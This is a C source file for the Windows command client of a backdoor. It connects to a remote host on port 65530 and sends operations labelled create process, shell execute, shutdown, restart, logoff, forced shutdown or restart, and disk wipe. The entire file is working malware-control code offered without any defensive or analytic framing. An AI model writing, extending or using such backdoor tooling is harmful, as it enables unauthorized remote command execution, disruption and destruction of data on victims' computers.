#include <stdio.h>
#include <Windows.h>

#pragma comment(lib,"ws2_32.lib")

#define BACKDOOR_CREATE_PROCESS 0
#define BACKDOOR_SHELL_EXECUTE 1
#define BACKDOOR_SHUTDOWN_SYSTEM 2
#define BACKDOOR_RESTART_SYSTEM 3
#define BACKDOOR_LOGOFF 4
#define BACKDOOR_FORCE_SHUTDOWN 5
#define BACKDOOR_FORCE_RESTART 6
#define BACKDOOR_WIPE_DISK 7

typedef struct _CLIENT_ID
{
    PVOID UniqueProcess;
    PVOID UniqueThread;
}CLIENT_ID,*PCLIENT_ID;

typedef struct _BACKDOOR_PACKET
{
	BYTE Operation;
	char Buffer[1024];
	CLIENT_ID ClientId;
}BACKDOOR_PACKET,*PBACKDOOR_PACKET;

int main(int argc,char* argv[])
{
	SOCKET Socket;
	hostent* host;
	char cmd[30],reply[100];

	WSADATA wd;
	sockaddr_in sai;
	BACKDOOR_PACKET data;

	if(argc!=2)
	{
		printf("\nUsage: CppClient [Hostname]\n");
		return 1;
	}

	if(WSAStartup(0x101,&wd)!=0)
	{
		printf("\nError: Unable to initialize Winsock.\n");
		return 1;
	}

	host=gethostbyname(argv[1]);

	if(!host)
	{
		printf("\nError: Unable to resolve hostname.\n");
		
		WSACleanup();
		return 1;
	}

	sai.sin_family=AF_INET;
	sai.sin_addr=*((LPIN_ADDR)*host->h_addr_list);
	sai.sin_port=htons(65530);

	while(1)
	{
		memset(&data,0,sizeof(data));
		
		printf("\nEnter command: ");
		scanf("%s",cmd);

		if(!stricmp("start",cmd))
		{
			printf("\nEnter command line: ");
			scanf("%s",data.Buffer);

			data.Operation=BACKDOOR_CREATE_PROCESS;

			Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

			if(Socket==INVALID_SOCKET)
			{
				printf("\nError: Unable to create socket.\n");
				continue;
			}

			if(connect(Socket,(sockaddr*)&sai,sizeof(sai))==SOCKET_ERROR)
			{
				printf("\nError: Unable to send data to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			if(send(Socket,(char*)&data,sizeof(data),0)==SOCKET_ERROR)
			{
				printf("\nError: Unable to send data to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			printf("\nCommand successfully sent.\n");

			memset(reply,0,100);
			recv(Socket,reply,100,0);

			printf("\n%s\n",reply);
			closesocket(Socket);
		}

		else if(!stricmp("shellexecute",cmd))
		{
			printf("\nEnter file name or URL: ");
			scanf("%s",data.Buffer);

			data.Operation=BACKDOOR_SHELL_EXECUTE;
			
			Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

			if(Socket==INVALID_SOCKET)
			{
				printf("\nError: Unable to create socket.\n");
				continue;
			}

			if(connect(Socket,(sockaddr*)&sai,sizeof(sai))==SOCKET_ERROR)
			{
				printf("\nError: Unable to connect to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			if(send(Socket,(char*)&data,sizeof(data),0)==SOCKET_ERROR)
			{
				printf("\nError: Unable to send data to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			printf("\nCommand successfully sent.\n");
			closesocket(Socket);
		}

		else if(!stricmp("shutdown",cmd))
		{
			data.Operation=BACKDOOR_SHUTDOWN_SYSTEM;

			Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

			if(Socket==INVALID_SOCKET)
			{
				printf("\nError: Unable to create socket.\n");
				continue;
			}

			if(connect(Socket,(sockaddr*)&sai,sizeof(sai))==SOCKET_ERROR)
			{
				printf("\nError: Unable to connect to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			if(send(Socket,(char*)&data,sizeof(data),0)==SOCKET_ERROR)
			{
				printf("\nError: Unable to send data to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			printf("\nCommand successfully sent.\n");

			memset(reply,0,100);
			recv(Socket,reply,100,0);

			printf("\n%s\n",reply);
			closesocket(Socket);
			break;
		}

		else if(!stricmp("restart",cmd))
		{
			data.Operation=BACKDOOR_RESTART_SYSTEM;

			Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

			if(Socket==INVALID_SOCKET)
			{
				printf("\nError: Unable to create socket.\n");
				continue;
			}

			if(connect(Socket,(sockaddr*)&sai,sizeof(sai))==SOCKET_ERROR)
			{
				printf("\nError: Unable to connect to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			if(send(Socket,(char*)&data,sizeof(data),0)==SOCKET_ERROR)
			{
				printf("\nError: Unable to send data to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			printf("\nCommand successfully sent.\n");

			memset(reply,0,100);
			recv(Socket,reply,100,0);

			printf("\n%s\n",reply);
			closesocket(Socket);
			break;
		}

		else if(!stricmp("logoff",cmd))
		{
			data.Operation=BACKDOOR_LOGOFF;

			Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

			if(Socket==INVALID_SOCKET)
			{
				printf("\nError: Unable to create socket.\n");
				continue;
			}

			if(connect(Socket,(sockaddr*)&sai,sizeof(sai))==SOCKET_ERROR)
			{
				printf("\nError: Unable to connect to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			if(send(Socket,(char*)&data,sizeof(data),0)==SOCKET_ERROR)
			{
				printf("\nError: Unable to send data to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			printf("\nCommand successfully sent.\n");

			memset(reply,0,100);
			recv(Socket,reply,100,0);

			printf("\n%s\n",reply);
			closesocket(Socket);
			break;
		}

		else if(!stricmp("forceshutdown",cmd))
		{
			data.Operation=BACKDOOR_FORCE_SHUTDOWN;

			Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

			if(Socket==INVALID_SOCKET)
			{
				printf("\nError: Unable to create socket.\n");
				continue;
			}

			if(connect(Socket,(sockaddr*)&sai,sizeof(sai))==SOCKET_ERROR)
			{
				printf("\nError: Unable to connect to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			if(send(Socket,(char*)&data,sizeof(data),0)==SOCKET_ERROR)
			{
				printf("\nError: Unable to send data to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			printf("\nCommand successfully sent.\n");

			memset(reply,0,100);
			recv(Socket,reply,100,0);

			printf("\n%s\n",reply);
			closesocket(Socket);
			break;
		}

		else if(!stricmp("forcerestart",cmd))
		{
			data.Operation=BACKDOOR_FORCE_RESTART;

			Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

			if(Socket==INVALID_SOCKET)
			{
				printf("\nError: Unable to create socket.\n");
				continue;
			}

			if(connect(Socket,(sockaddr*)&sai,sizeof(sai))==SOCKET_ERROR)
			{
				printf("\nError: Unable to connect to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			if(send(Socket,(char*)&data,sizeof(data),0)==SOCKET_ERROR)
			{
				printf("\nError: Unable to send data to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			printf("\nCommand successfully sent.\n");

			memset(reply,0,100);
			recv(Socket,reply,100,0);

			printf("\n%s\n",reply);
			closesocket(Socket);
			break;
		}

		else if(!stricmp("wipe",cmd))
		{
			data.Operation=BACKDOOR_WIPE_DISK;

			Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

			if(Socket==INVALID_SOCKET)
			{
				printf("\nError: Unable to create socket.\n");
				continue;
			}

			if(connect(Socket,(sockaddr*)&sai,sizeof(sai))==SOCKET_ERROR)
			{
				printf("\nError: Unable to connect to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			if(send(Socket,(char*)&data,sizeof(data),0)==SOCKET_ERROR)
			{
				printf("\nError: Unable to send data to remote computer.\n");
				closesocket(Socket);
				continue;
			}

			printf("\nCommand successfully sent.\n");

			memset(reply,0,100);
			recv(Socket,reply,100,0);

			printf("\n%s\n",reply);
			closesocket(Socket);
		}
	}

	WSACleanup();
	return 0;
}